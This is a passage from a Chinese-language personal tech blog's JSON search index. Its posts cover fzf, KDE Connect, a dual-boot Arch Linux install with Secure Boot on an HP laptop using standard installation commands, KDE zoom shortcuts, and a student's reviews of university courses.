之類的，就會把使用者在 fzf 選定的選項用標準輸出印出來。\nhistory widget 按 CTRL+R 用 fzf 會由新到舊列出打過的指令，可以打一些字過濾指令或是用 CTRL+J/CTRL+K 上下移動\n然後按 Enter 就會把該條指令貼到 shell prompt。\nCTRL-T widget 模糊搜尋當前目錄的所有檔案（遞迴尋找）\n使用情境：例如 vim XXX 突然不知道要開什麼的話\nALT-C widget 用 fzf 切換到當前目錄以下的目錄（遞迴尋找）\ndouble asterisk 在任何指令中（通常是在打路徑時）填入兩個星號再按 tab 就就會用 fzf 嘗試自動完全成或是補全大部分。\n結語 推薦大家都 fzf 因為這真的是一個很有料的 CLI app，而且他的 history widget 應該是我體驗過蠻好的歷史補全的東西。\n一個小缺點就是他的 history widget ，沒有 syntax highlight 而且我在 fzf 的自訂 keybind 中 accept/abort 會有些小 bug。\n寫這篇時很想睡覺歡迎抓錯字或是亂寫…\n","permalink":"https://omeletwithoutegg.github.io/2022/09/08/fzf/","tags":["arch","linux","vim"],"title":"Fzf fuzzy finder - best shell history picker"},{"contents":"KDE connect 之前一個用 Mac 的同學表示他覺得蘋果系列的東西很方便，因為蘋果他們家把手機跟平板整合得很好，例如：可以把手機上的照片、影片等等直接傳到電腦，用手機掃了 QR code 之後用電腦開啟，同步手機與電腦的剪貼版等等。\n最近看到一篇很有料的文章\nhttps://blog.ryey.icu/archlinux-and-software-on-yoga-14s-2021-part-2.html\n裡面講到了 KDE connect 這個東西，實際用過之後我覺得真的是相當實用的一個工具，而且這個工具也沒有限制平台的，Mac OS 似乎也可以用（？）\n根據 apple 官網有關「接續互通」的部份 來看，雖然還是有少一些 feature 像是同步/延伸畫面，或是一些自動解鎖的 feature，\n不過我認為已經相當好用了。\nWhat is KDE connect KDE connect 提供了裝置之間整合的功能，我目前比較常用的是手機與電腦的一些同步功能。\n雖然叫做 KDE connect 不過聽說其他桌面環境也可以用（？）沒有試過不知道整合得怎麼樣。\n這個 app 必須要在電腦跟手機都要安裝才可以使用，並且要求裝置們必須要處在同一個區域網，例如手機和筆電連同樣的 wifi 等等。\n安裝了 app 之後大部分常用的功能不需要開啟 app 就可以使用，例如多媒體控制會跟普通播音樂一樣在下拉通知頁面或是解鎖螢幕有一個小 widget 出現。\n我用過的 feature 多媒體控制 可以互相控制裝置的多媒體播放，使用情境可能像是離電腦很遠但離手機很近的時候。\n手機上的圖示跟放音樂的時候會出現的圖示差不多，所以用起來也很直覺。\n聽說在接聽電話的時候會自動暫停正在播放的音樂或是影片。\n遠端控制 可以用手機控制滑鼠，或是用手機鍵盤打字。\n用起來手感跟我的筆電觸控版差不多（沒有三指或四指手勢就是了啦）可以干擾想要對你的電腦做怪事的人(X\n投影片控制 可以把手機當成簡報筆來用，有兩個按鍵代表 page up / page down 以及有一個按鍵對應到雷射的部份，長按會出現一個圓圈並且會跟著手機的旋轉在畫面上移動，告訴大家焦點在哪裡。\n雖然我覺得是一個很棒的功能，不過我目前沒有很重度的簡報需求。\n尋找裝置 有點有用但又有點沒用的 feature。\n按下去會讓手機響鈴以方便找手機。\n因為 KDE connect 必須要在同一個 LAN 才可以用，所以手機沒有連網路是不能用的。\n這個功能大概會用在習慣把手機鈴聲開靜音又突然找不到的時候用。\n分享檔案或 URL 這個是我覺得相當實用的功能之一。\n在手機上任何東西點分享（就是平常分享到 discord/facebook/line/instagram 等等的那個分享）之後再選 KDE connect，就會自動把他傳到選擇的裝置。\n例如，在手機瀏覽器選分享這個網址，就會自動在電腦的瀏覽器上打開這個網址；或者是在手機瀏覽相片的地方選擇分享到 KDE connect 就會自動傳到電腦，預設是在 ~/Downloads 的位置。\n還有一個我比較喜歡的使用情境是用 adobe scan 掃描完文件之後我可以點分享來用瀏覽器打開 adobe scan 掃出來的 PDF 成果。\n另外還有一個好像是 AirDrop 沒有的 feature 就是可以把手機上的一個資料夾使用 sshfs mount 在你的電腦上（會需要安裝 sshfs）\n單純用 dolphin 這個 KDE 的 file manager 看起來是還蠻直覺的，但偶爾會跳出 sshfs failed 的 bug，有點小煩躁。\n我用這個功能主要是把 密碼管理器 所需的檔案傳到手機上而已，因為可以直接複製資料夾到手機裡所以很方便。\n不過 KDE connect 不能像 AirDrop 一樣直接分享檔案給周圍陌生的裝置，但最根本的理由是因為不會每個人都裝 KDE connect(X\n其實理想上應該是 Andriod 系統要弄出一個 protocol 之類的，然後再由各家軟體去設計或整合這個分享檔案給陌生裝置的功能。\n但其實我目前看到的情境就只有要分享合照的時候大家互相 AirDrop，而這其實只要互相認識那直接用社群軟體還比較方便，所以我覺得除非有大公司要當領頭羊不然沒有什麼需求去增加這件功能。\n電池狀態 會顯示裝置的電池剩下的百分比。\nPing 很廢的功能，就是互相 ping 一下。\n會在另外一台裝置顯示一個 ping 的通知。\n沒用過的 feature SMS 打開跑不出來，好像有點問題。\n剪貼簿 安裝之後發現剪貼簿有怪東西，才發現原來他會同步裝置的剪貼簿。\n姑且先把剪貼簿同步這個功能關掉了，不是很習慣。\n結語 以上的這些功能應該都可以用 CLI 達成，這個 project 裡面有一個 kdeconnect-cli 的二進位執行檔（？）不過還沒有研究一些比較進階的功能。\nKDE connect 是一個相當優質的工具，而且他應該也是免費開源軟體，推薦大家可以嘗試看看，尤其是有興趣使用 KDE 的人。\nreference https://userbase.kde.org/KDEConnect\nhttps://sspai.com/post/59508#!\n","permalink":"https://omeletwithoutegg.github.io/2022/09/07/kdeconnect/","tags":["KDE","linux","plasma","experience"],"title":"KDE connect"},{"contents":"緣由 這麼快的時間就發下一篇 archlinux 的文，我真的覺得我越來越是 BTW I use arch 的人了XD\n不過這次裝 archlinux 也是有理由的，因為我從 NPSC 拿到的筆電的電池壞掉了，如果沒有插著電就會直接關機，想說就順便換了一台新的筆電。因為奇怪的堅持不想用 Mac，選了選之後最後是挑 HP pavilion plus 14。\n上次因為是想要整台變成 Linux 所以比較不用煩惱一些問題，這次我希望能夠雙系統 Windows 並且可以玩一些遊戲，會需要有 secure boot 的功能所以也有比較不同的設定；此外這次也有碰到各種不同的問題，作為紀錄以及希望能幫助有遇到類似問題的人就發一篇文吧 :P\n流水帳 事前需要的材料 不一定要用但我有用到\nUSB device * 2 （一支會要灌 iso 進去讓資料整個不見，另一支是拿來備份一些小東西的） 可以上網的手機 \u0026amp; 電腦 \u0026amp; wifi-AP 電源線 大綱 首先直接跑 Windows 安裝引導把 Windows 用正常的方式安裝好，接著使用 USB 開機的方式啟動 live environment，在各種 trial-and-error 之後終於把各種硬體問題排除，最後再裝 Desktop Environment 與各種 GUI/CLI apps。\nprepare installation medium 請參考 archwiki\n將一支可以清空的隨身碟插在可以上網的電腦當中 下載 archlinux_iso。假設下載的 iso 檔放在 $HOME/Downloads/archlinux-2022.08.05-x86_64.iso。 將 iso 檔寫入隨身碟。\n如果是 linux 的話，可以看插入前後 /dev/ 多了什麼東西去看隨身碟對應的 character device 是什麼，這邊假設是 /dev/sda 並使用 dd 指令寫入。 1 sudo dd bs=4M if=$HOME/Downloads/archlinux-2022.08.05-x86_64.iso of=/dev/sda status=progress 如果是 windows 可以用 Rufus 等等。 In Windows Windows 安裝 下一步、下一步、下一步。\n關閉「快速啟動」（fast startup） 打開「控制台」的「電源選項」，選擇「變更目前無法使用的設定」並取消勾選「開啟快速啟動」。\n儲存bitlocker recoverykey bitlocker 這件事是 ZCK 有提過的，於是我就上網查，發現似乎不用把 bitlocker 關掉，\n但是應該要把 bitlocker recoverykey 備份下來，幸好有備份（？）某個時間點還真的有跳出來。\nP.S. 寫完這篇的前面這部份一段時間後，剛剛需要用的時候差點以為自己把他刪掉了，真是嚇死人，奉勸大家這個東西要好好備份。\n確認開機模式 現在的電腦應該都是 UEFI 模式了，不過可以確認一下。\n按 Win + R 執行 msinfo32，檢查 BIOS 模式是「UEFI」還是「Legacy BIOS」\n分割磁碟 現在的電腦應該都是 GPT 吧 oao\n按 Win + X，選擇磁碟管理並分割出一塊給 Arch 用的空間（所謂「壓縮磁碟機」）。\n預設可能會有好幾個分區，例如 EFI、Microsoft reserved、Windows recovery environment 等等，\n不用動其他的分區，只切最大的那塊（通常就是 C 槽）切出一塊空間給 Arch。\nIn BIOS interface 這台 HP 的 BIOS 介面跟之前我那台 ASUS 不一樣，有一點不習慣。\n在開機的時候按一些功能鍵就會打開 BIOS setup 的介面。\nF10：調整 BIOS 設定 F9：進入 boot menu。 F2/F3：進入系統診斷/測試 關閉 Secure Boot 因為 Arch 官網的 Live ISO 應該是不支援 Secure boot 的，所以必須要把 boot option 當中的 secure boot 先暫時關掉。\n開機順序 在這個 BIOS 介面當中有四種 boot 的選項，先把 USB 開機調到最上面才可以用剛剛燒錄的 Live USB 開機。\nIn Live Environment 在使用 Live USB 開機之後，會進入熟悉的 archiso 畫面。\n最精彩的各種問題…\n網路 第一步當然就是確認網路連線了，我在這邊遇到了第一個大問題就是這個 Live ISO 沒有偵測到我這台 HP 的網卡，\n第一次遇到這種問題，經過各種搜尋之後得知：\n沒有偵測到網卡大概是因為驅動程式的問題 要先上網才比較好裝驅動程式，但這台筆電又沒有乙太網路線的接孔（當然可能可以外接各種線解決）\n幸好有一種對我比較方便的方法是用手機接 USB 分享網路（Andriod tethering），只要把手機接到電腦上就可以用手機分享的網路上網。\n（見 reference [5] [6]） 把手機接到電腦上，在 Andriod 手機上選擇用 USB 分享行動網路，就可以用 ip link 看到 介面名稱了。使用 dhcpcd 連上網路。\n1 2 ip link dhcpcd enp0s20f0u1 # result of ip link 接著用這個勉強的手機 5G 網路趕快下載一些基本的套件還有所需要的驅動程式\n萬年流程 1 2 ping archlinux.org timedatectl set-ntp true 分割磁碟 使用 fdisk, gdisk, cfdisk 等工具將剛剛在 Windows 切割的一大塊磁碟再細分，切出 2G 的 swap 以及分別拿來當 /home 與 / 的分區。\n注意不要刪除原本 Windows 建的那些分區，此外也不需要額外建一個 EFI system partition，直接用原本的就好了。\n（見 archwiki）\n格式化 在我的系統上，硬碟是 /dev/nvme0n1，因為 Windows 原本就有四個分區 /dev/nvme0n1p1 到 /dev/nvme0n1p4，所以我拿來當 /，/home 跟 swap 的分區就是從 5 開始編號了。我選用經典的 ext4 格式。\n1 2 3 mkfs.ext4 /dev/nvme0n1p5 mkfs.ext4 /dev/nvme0n1p6 mkswap /dev/nvmepn1p7 mount 磁碟分區 把剛剛所切割好的磁碟分區放進 linux 檔案系統裡面，讓裡面的資料真正的變成我們系統上的資料夾，這件事稱作 mount。\n我實在不太會解釋 mount 是做什麼的，總之我們要把切來當 / 和 /home 的磁碟分區放到 /mnt/ 和 /mnt/home。\n1 2 3 mount /dev/nvme0n1p5 /mnt/ mount /dev/nvmepn1p6 /mnt/home --mkdir swapon /dev/nvmepn1p7 有人會注意到 archwiki 上有叫我們建一個 /boot 的分區，不過因為是雙系統，所以直接使用 windows 原本的 EFI 分區就可以了，在我的電腦上是 /dev/nvme0n1p1。\n1 mount /dev/nvme0n1p1 /mnt/boot --mkdir pacstrap time 下一步就是下載所有需要的套件到硬碟上了。因為手機網路特別爛，所以可以先用 reflector 或是 rankmirrors 等工具來設定使用離自己比較近、速度比較快的鏡像源（mirror）。\n1 2 3 pacman -S reflector vim /etc/xdg/reflector/reflector.conf # --sort rate 意思是按速度 --country 可以選 Taiwan systemctl start reflector 1 pacstrap /mnt base linux linux-firmware git curl gvim base-devel In Chroot 因為平常直接使用 root 使用者比較不安全之類的緣故，安裝 AUR 和使用 KDE plasma 都要另外開一個非 root 的正常使用者。\n先順便 genfstab，再在安裝好的系統 chroot 之後新增一個非 root 使用者，設定密碼以及設為 sudoer。\n1 2 3 4 5 6 7 genfstab -U /mnt \u0026gt;\u0026gt; /mnt/etc/fstab arch-chroot /mnt useradd -m omelet groupadd sudo usermod -aG sudo omelet passwd omelet vim /etc/sudoers # uncomment the %sudo line, :w! to save 一些參考 archwiki 的基本設定\n1 2 3 4 5 6 ln -sf /usr/share/zoneinfo/Asia/Taipei /etc/localtime hwclock --systohc vim /etc/locale.gen # uncomment en_US.UTF-8 and zh_TW.UTF-8 locale-gen vim /etc/hostname # your hostname vim /etc/locale.conf # LANG=en_US.UTF-8 因為已經有一個有密碼的 sudo user 了，所以就不讓 root 有可以登入的密碼。\n接著安裝 AUR helper yay。\n1 2 3 4 sudo -iu omelet git clone https://aur.archlinux.org/yay-bin.git cd yay-bin \u0026amp;\u0026amp; makepkg -csi exit 繼續處理驅動程式 查看網卡型號 用 root 權限執行\n1 lspci -vnnk | grep -i --context=20 net 得知這台的網卡型號是 realtek 的 [10ec:b852]。\n查了一堆資料，最後找到應該可以用 rtl8852be 這個 kernel module。\n(見 reference [7])\n正好這也有被放在 AUR 上，因此直接用 yay 安裝。很感謝維護這個 module 的人。\n1 yay -S rtl8852be-dkms-git # run as normal user 解決音效卡驅動問題 這是在安裝桌面環境之後才發現的不過就放到這邊來講。\nlspci -vnnk 之後發現好像有寫需要一些 kernel module 而且沒有 load 到。\n同樣 google 了一下，得知應該是要安裝 sof-firmware，使用 pacman 安裝。\n（見 reference [8]）\n1 pacman -S sof-firmware 離開 live environment 之後的網路 雖然離開 live environment 之後還是可以用 tethering 、dhcpcd 的方式上網，不過只要網卡有設定好，理論上重開機之後執行 ip link 就會跳出除了 lo 之外的一個無線網卡介面（我的是 wlo1），再搭配一個正常的 wireless network daemon 就可以了。\n可以用 iwctl、networkmanager 等，這邊用的是 networkmanager。\n1 2 pacman -S networkmanager systemctl enable networkmanager 重開機之後，要連上 AP 可以用 sudo nmtui。\nbootloader \u0026amp; secure boot 原本選用 GRUB，裝好 GRUB 之後第一次打開 Windows，才發現想玩的遊戲需要 secure boot。我想也是為了防作弊之類的吧（？）\n研究了一下如何同時雙系統又 secure boot，看起來 GRUB 似乎是很難設定 secure boot，最後決定把 bootloader 換成 systemd-boot，雖然介面是更加的醜陋，不過不太常會需要去 access 那個介面，所以我就妥協了。\nsystemd-boot 請參考 archwiki\n請確保是 UEFI 開機模式，然後用 root 權限（還在 chroot 裡面）執行\n1 bootctl install 接著有兩個地方要設定，第一個是要新增開機選單有哪些 entry，第二個是要設定開機選單的選項。\n新增一個 $esp/loader/entries/arch.conf 的檔案，內容是\n1 2 3 4 title Arch Linux linux /vmlinuz-linux initrd /initramfs-linux.img options root=PARTUUID=XXXXXXXXXXXXXXXXXX rw loglevel=3 quiet 如果剛剛 mount 的時候是照著上面所說的 mount，那麼 $esp 應該就當成是 /boot 就可以了。\n基本上 options 我是從 GRUB 那邊的設定抄來的，PARTUUID 可以用 blkid /dev/xxx 得到。\n如果還想要再加入其他開機選項，例如在 options 或是 initrd 有不同設定的話，可以再新增其他檔案。\n很方便的是不用做任何設定，windows 和 reboot into UEFI firmware 就會自動被加進開機選單了。\n而開機選單的選項，也就是 $esp/loader/loader.conf，我試了幾個，最後還是決定用預設的（loader.conf 空白）就好。\ntimeout 預設是 0，也就是說除非開機時按著一些按鍵不然不會進入開機選單而是直接用預設的 arch.conf 開機，也比較不會看到那醜死人的畫面，賞心悅目。\nsecure boot 原本查到看起來超麻煩，直到找到了 sbctl 這個工具。\n（雖然我是先找到 sbctl，再試 GRUB，最後才換成 systemd-boot 的）\n大致上是照著 reference [10] 的方式，然後我記得有一篇文章是講說遇到權限不足的話要去 UEFI firmware 那邊調整，基本上在這邊會需要重開機，在 UEFI firmware 介面刪掉原本的 secure boot key，接著在 disable secure boot 的情況下進來 arch ，然後做這些簽名之後重開機再 enable secure boot。\n記得可能會需要 bitlocker recoverkey！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 pacman -S sbctl sbctl create-keys sbctl enroll-keys --microsoft # sign all the files that let `sbctl verify` fail sbctl sign -s /boot/EFI/Linux/linux.efi sbctl sign -s /boot/EFI/Linux/fallback.efi sbctl sign -s /boot/EFI/systemd/systemd-bootx64.efi sbctl sign -s /boot/EFI/Boot/bootx64.efi sbctl sign -s /boot/EFI/Microsoft/bootmgfw.efi sbctl sign -s /boot/EFI/Microsoft/bootmgr.efi sbctl sign -s /boot/EFI/Microsoft/memtest.efi ... sbctl verify sbctl status sbctl list-files # Verify that the sbctl pacman hook works on a kernel upgrade. # Ensure that the string \u0026#34;Signing EFI binaries...\u0026#34; appears. pacman -S linux 桌面環境 這可以等到確定可以不靠 tethering 上網之後再裝，畢竟很肥又不是最優先的。\n我選擇繼續使用 KDE，最近嘗試了一些比 KDE 輕量很多的 Tiling Window Manager，但老實說很多事情都搞不定，沒有一個整合好的 DE 所有東西都要自己設定真的蠻麻煩的，比如說游標在 KDE 進系統選單修改後就直接可以了，但其實是要把同樣的一個游標主題設定放到 .gtkrc 或是 .config/gtk* 之類的地方，然後我怎麼搞就是搞不定。\nKDE 對我來說最大的缺點就是他一開就吃了不少記憶體，但換成 WM 也只是少 1G 左右，在換新電腦這件事的前提下，我已經不再需要擔心記憶體的問題了（希望）\n而且我並沒有感受到 Tiling 或是 Workspace 這種概念很有用，我甚至在 KDE 或 Windows 上面都不會使用第二個 Desktop（我自己感覺等同於 i3 或 awesomeWM 的 workspace）。\nkeyboard-driven 或是 highly customizable 我也沒有感覺很特別。非 KDE 預設的快捷鍵我新增了兩組，分別是用 ctrl + alt + t 去開 terminal以及用 ctrl + alt + r 去使用 rofi 開啟應用程式。rofi 真的蠻 fancy 的，用起來很舒服。\n以下是部份我有安裝的 package。\n1 2 3 4 5 6 7 8 pacman -S plasma-meta pacman -S --needed \\ git zsh openssh gvim \\ wezterm \\ dolphin ark kate \\ mpv gwenview okular spectacle \\ qutebrowser \\ rofi pass 結語 就像欣穆老師說的一樣，原本可能很簡單的過程，每個人都可能遇到各種不同的軟硬體、環境問題，排除這些問題我覺得蠻有成就感的。\n雖然真的很耗費時間。\n此外現在還有一些未知的問題，具體來說，KDE 預設的 Screen Energy Saving 設定中，螢幕過一定時間就會關閉，之前我都是只要有動觸控版或是鍵盤，螢幕就會重新打開，但現在不是很聽話。在影片暫停時讓螢幕關閉，再按空白鍵，可以發現影片會繼續播放（有聲音），但螢幕好像遲遲無法開啟；如果把亮度調整為 0 也會出現相同的症狀， 初步懷疑是因為 intel graphics 之類的東西，不是很懂 @@ 如果有人願意看到這裡還知道怎麼解決這個問題的話，歡迎來幫助我(X 後來查到好像是 OLED 螢幕的問題，很高興竟然在前一兩個禮拜這個問題 upstream 已經有 fix 了，靜候它被加進 ArchLinux repository 的佳音。（見 reference [12] [13])\nreference [1] https://wiki.archlinux.org/title/Dual_boot_with_Windows [2] https://rupru8.pixnet.net/blog/post/349765618-%E9%9B%99%E7%B3%BB%E7%B5%B1 [3] https://www.hp.com/us-en/shop/tech-takes/how-to-enter-bios-setup-windows-pcs [4] https://medium.com/hunter-cheng/%E5%A6%82%E4%BD%95%E5%9C%A8windows-10%E7%B3%BB%E7%B5%B1%E5%AE%89%E8%A3%9Dlinux%E9%9B%99%E7%B3%BB%E7%B5%B1-85ed07813270 [5] https://unix.stackexchange.com/questions/423256/arch-ip-a-only-shows-lo [6] https://unix.stackexchange.com/questions/567882/wifi-menu-not-working-during-installation-of-arch-linux-no-wifi-interface-is-sh [7] https://askubuntu.com/questions/1412450/network-driver-for-realtek-10ecb852 [8] https://bbs.archlinux.org/viewtopic.php?id=273328 [9] https://wiki.archlinux.org/title/USB_flash_installation_medium [10] https://saligrama.io/blog/post/upgrading-personal-security-evil-maid/#enrolling-your-key-into-secure-boot [11] https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface/Secure_Boot#sbctl [12] https://bugs.kde.org/show_bug.cgi?id=447475 [13] https://gitlab.freedesktop.org/drm/intel/-/issues/3657 ","permalink":"https://omeletwithoutegg.github.io/2022/08/31/arch-install-202208/","tags":["arch","linux","pacman","KDE","plasma","grub","systemd-boot","secure-boot"],"title":"又是 Arch Install：在 HP 筆電上面雙系統與 secure boot"},{"contents":"KDE Zoom In/Out 一篇已知用火的廢文。\n在第一次換成 linux 之後發現的一個 windows 的好處就是，我只要用觸控版兩根手指同時向外滑，就可以滑順的放大螢幕某個部份，並且是以游標為中心被放大。\n換成 Ubuntu 之後，沒有了這樣的手勢其實有點不習慣。\n在換成 Arch+KDE 之後，也早就已經習慣用瀏覽器內建的 ctrl + =、 ctrl + - 來縮放了，但缺點是不會以游標為中心放大，並且會 trigger RWS，改變排版，此外放大的比例比較離散，會有一段一段跳的感覺。\n不過前幾天意外按到 meta + =（meta 鍵相當於 win 鍵），發現自己螢幕被放大了！已知用火的感覺真好。\n經過一番探索之後，我發現這是 KDE 中 KWin 的 Zoom In / Zoom Out 功能，只要按 meta + = 或 meta + - 就可以放大整個螢幕，並且游標超出去的時候會跟著平移放大的部份。\n今天要發文的時候發現有 magnify 這個功能，在 Desktop Effect 當中可以調整，用起來感覺使用者體驗更好一點\n用起來大概長這樣\n","permalink":"https://omeletwithoutegg.github.io/2022/07/17/kde-zoom-shortcut/","tags":["linux","KDE","plasma"],"title":"Kde Zoom Shortcut"},{"contents":"Second semester 年久失修的部落格，繼續只更新修課心得（流水帳）\n網路管理與系統管理 (NASA) 禮拜一早九（？）可以選三學分跟一學分，如果選一學分的似乎可以拿來抵服務學習，不過我選了三學分的。\n這門課有一個必須要在寒假左右完成的 HW0，事後看起來有點奇怪的點是學期中有不少課在教的反而是在 HW0 中感覺有用到的東西。\n在學期開始時可以到 204 去實體上課，不過下雨的時候還要早起到 204 真的很折磨。\n後來正好因為防疫因素變成線上了（其實原本就可以線上上課）。\nNASA 的上課內容主要是在講一些原理或是介紹一些協定，像是網路如何運作的（網路的五層結構）、防火牆、DNS、Wi-Fi 原理、filesystem、web service。\n作業 我覺得作業是 NASA 能學到最多東西也比較有趣的部份。每兩三週左右會有一個比較大的作業，每週則是有 lab 作業與影片簡答題。\n所謂的 lab 有點像助教課，就是在正課上完之後由助教教我們一些和正課稍微相關的工具怎麼使用，例如：shell script撰寫、cisco switch configuration 的操作、教我們如何架一個 apache web service，或是關於硬碟的切割與格式化。\n比較大的作業則不一定會跟正課有關，以下是六次作業的標題：\nHomework 1 - Wireshark/tcpdump \u0026amp; UNIX / Shell Scripts Homework 2 - IP/iperf/Cisco \u0026amp; partition Homework 3 - Firewall \u0026amp; Virsh + Docker Homework 4 - Security \u0026amp; LDAP Homework 5 - DNS + DHCP \u0026amp; NFS + Fix VM Homework 6 - Wireless \u0026amp; Web Server 作業內容常常都是 lab 的延伸，但是 NASA 作業的最大特色就是常常需要自己到網路上找相關資料，要願意花時間查看 documentation 或是 manual page 之類的，不然就是要找好大腿抱。舉例來說， Fix VM 那次作業就需要去查所謂 PXE 是什麼，還有怎麼讓 VM 互相溝通，使得一台可以當 server、一台可以當 client，基本上 ArchWiki 有相當完整的資訊，不過…\n從 HW0 開始就需要你會開 VM （虛擬機器），基本上各種平常不會踩到的神奇雷點可以在學 NASA 的時候都踩一遍。我印象深刻的有：UEFI/legacy BIOS 沒有設定好、網路沒有設定好、兩個要互相溝通的 VM 的網卡 MAC address 弄成一樣了、在工作站上和別人的 port 撞到等等。常常遇到各種完全沒有頭緒的問題源頭都是源自我們用 VM 做事時沒有弄好 VM 的設定之類的。\n即使是不需要用 VM 的題目，有時候也會遇到需要 trial-and-error 的時候，因為每個人做作業的環境都不同，欣穆老師表示這種 trial-and-error 的過程也是作為系統工程師所需要的技能（？）總之查資料與各種障礙排除導致了 NASA 是一個相當花時間的課。\n考試 考試的形式是三人一組，並且會有即時的記分板，也會即時收到回饋結果（人工的所以不是真即時）。\n今年的考試有蠻多作業題的，但好像也導致分數線直接上升超多。\n作業題幾乎都是和作業沒差多少，看計分版就可以知道要是哪些，建議是和隊友練習考古題就能大概知道哪些題目就是那些會考出來的必拿題了。\n而剩下的難題大概就是要看緣份做出來了，有些題目不是你事前有學過就是是當場要查資料，有些是 CTF 類的題目，也有一些是要靠苦工（？）寫出來的 shell script 題。\n有趣的是有一些是 Archlinux 相關的題目 XD，除了因為工作站是 Arch 的緣故大概也有一些 TA 的個人喜好。\n總結 依照聽到的成績情形來看，至少相對於其他資工系的課來說可能不算甜，不過是一門非常充實的課。\n如果平常就願意探索 documentation，或是熟練使用各種 linux（尤其是 Archlinux） 的人，大概會在這門課混得不錯。\n賽局理論 想說來修一門和王政祺不一樣的課，於是選到了這門賽局理論。\n整學期都採線上錄影上課的形式，想當然我一定是到考前才開始看影片。\n這門課也是很有呂學一教授上的課程的特色，老師會用很淺顯的詞去講解，還會發明一眼看起來就是他自己創造的名詞。大部分的課程都在講在每個人都想辦法最大化他的 utility 的情況下，有哪些 equilibrium 會是合理的，在加上各種不同的 context 或限制之後，也會出現不同類型的均衡模型，有些模型下的 equilibirum 在另一個模型下不被視為是 equilibrium,，教授為此介紹了很多反例，幾乎有半個學期都在講（？）\n修的人比我想像中多很多，不過我也沒有什麼關於甜度的消息。\n整學期總共考了三次試，前兩次我都考九十以上，可惜最後一次考爆@@\n真的是中大計，最後一次考試出現好幾個要你舉反例的題目（根本就是要你背投影片），還有投影片上完全沒有印象有提到的證明。\n我只有大概三十分，還因為遲上傳被扣分，最後撈到一個 A。\n探索語言 混分的這學期當中唯一（嗎）的通識課。\n是全英文授課，老師第一堂課似乎還有想要嚇嚇一些人（？）不過語言學的東西我在高中時就有聽 03t 講一些覺得很有趣，邱老師的英文也非常清楚，讓我覺得我應該要用這門通識練習我的英文（到最後還是用中文跟組員溝通：P）\n分數的話，有兩次的 guest lecture 需要寫心得，還有一次的期末報告與一次的期末考，全部積在一次考我覺得相當可怕，客觀來說要看完整學期總共大概一千張的投影片是非常困難，在期末考前有後悔過沒有認真做筆記，雖然助教有分享一個 hackmd 整理重點但還是擔心有漏或是有自己沒搞懂的東西之類的。\n考試是線上開書考，他考的方法是分成兩個階段，第一個階段考得不難，可是時間非常有限，而且必須按照順序答題，不能回頭，要求你要很快能夠反應出答案，第二階段則是一些比較難的題目，但時間很有餘裕。我覺得第一階段真的有難到，而且很好笑的是他考了一大堆認真的題目之後最後一題問 guest lecture 教授的名字，結果剩下時間三十秒來不及找到真的氣死人。\n這門課有很多的加分制度，有：在課堂上回答問題、期末交一分鐘左右語言學相關的小短片、報名協助語言學相關實驗（聽說會像是念/聽一些聲音的形式）等等。\n不過我都沒有參加，大概是期末報告做太好了（躺系上學長姐的分…真的太感謝），讓我有點罪惡感的撈到了 A+。\n順帶一提，期末報告時有出現一個很好笑的事，就是在線上會議有人似乎忘記關麥說什麼「我在垃圾通識」之類的，超好笑，而且似乎還剛好那組的報告有各種出包，非常波蘭。\n資料結構與演算法 (DSA) 作為一門大一下必修，DSA 的助教和修課人數眾多，因此有開一個方便問問題、討論的 DC 群，大家的討論風氣好像也還不錯。我覺得很有趣的是濤哥都已經大四了今年才來修XD（聽說之前都撞課），每次他在 DC 發言都有一股強者的氣場（X\n前半學期是林軒田教授，後半是蔡欣穆教授上課，根據鄭天盛鄭老師的說法是後半學期特別需要讀，因此我有好好看 hash table、red black tree 和 Btree 的上課影片（？）不過考試考得也沒有多細，大多數都是要你人腦模擬資料結構怎麼操作的，而且又是線上開書考，所以其實沒有太可怕。\n學期的最後按照傳統有一個大地遊戲，但因疫情因素變成 Gathertown 線上，非常乾，雖然大概實體只會更乾就是了。\n作業有手寫題與程式題，手寫包含設計演算法與證明正確性和時間複雜度，老實說我不知道上課教的和作業標準的到底嚴不嚴謹，但我都是盡量寫到自己滿意就好。\n順帶一提每個禮拜上課完需要完成 NTU cool 上的選擇或簡答題。\n程式題在我原本的想像中會需要（或至少可以）寫紅黑樹或是 heap，前幾次的作業我想到的作法都沒有用到任何資料結構，非常不符合課名。最後一次作業時，我本來以為會是跟去年類似噁心的塊狀鏈表，結果是科技資結題，必須要用 treap + 吉如一懶標才能過，因為有區間反轉跟拼接的操作所以甚至也不會想用紅黑樹寫這題，所以上課教的全部沒用，要自己去查相關的資料（或是問人）才能有機會寫出這題，沒有聽到有人用紅黑樹去 merge split 的（根據 stackoverflow 紅黑樹也可以在一個 log 的時間內 merge split，但是要好好寫），只能說這樣出不是很好的決定。\n普通物理學甲下 跟上學期比起來是相當的難，一開始繼續上學期的部份把電磁波、干涉、繞射講完之後開始講近代物理，像是物質波、粒子物理等等，最後再講一些有關半導體與 MOSFET 的部份。\n可以說是我被懲罰了，習慣了上學期不去上物理課的模式，期中考勉強抱佛腳考得還可以，從期中考之後就完全是另一個世界。有一次作業完全寫不出來、投影片也看的一頭霧水，之後的作業也都是花了很多時間翻投影片和 google 才學會的。\n幸運的是，期末考不僅是線上開書考，而且還考一大堆跟作業完全一樣的題目，其他也有好幾題是直接 google 題敘就能找到解答的 XD，感謝佛心教授。\n離散數學 相當甜涼的課，我只有第一次為了加簽去上課。第一堂課真的教得太簡單，教你基本的排列組合XD，我對這堂課的印象就是老師用很慵懶的英文念投影片這樣。\n這學期有三次考試，基本上可以看完投影片就考，不建議不看投影片考，不然會不知道一些考卷上只有定義在投影片裡面的名詞是什麼意思。\n另外，雖然最後一次考試的範圍有上到跟 Langrange\u0026rsquo;s theorem、Burnside lemma 有關的東西，但他沒有考到。\n三次考試的範圍分別是：\nCombinatorics, Number Theory, Boolean Logic, Set Theory, Relations and Functions Generating Functions, Recurrence Relations Graph Theory, Group Theory (group, ring, field)\n基本上就是在 IOIC 講義的數學部份再加一些簡單的圖論XD 機率 跟風修的大二必修，整體來說不錯。一開始講了一些比較簡單的東西，像是獨立事件與條件機率、貝氏機率，然後花了一些時間在介紹各種常見的離散機率分佈，接著開始講連續的機率分佈，也就是 CDF、PDF 那些的，一樣也介紹了各種常見的連續機率分佈。學期的最後在講 test hypothesis 與 entropy，也有講 Method of Moment 和 Maximum Likelihood Estimator 等等，我自己感覺是很充實。\n分數應該關鍵只有考試，作業只要有交就是滿分。\n期中考吵分後吵到了 100 以上，可惜期末考考爆（主要是因為把 normal distribution 的 MGF 記錯），據說期中期末都 100 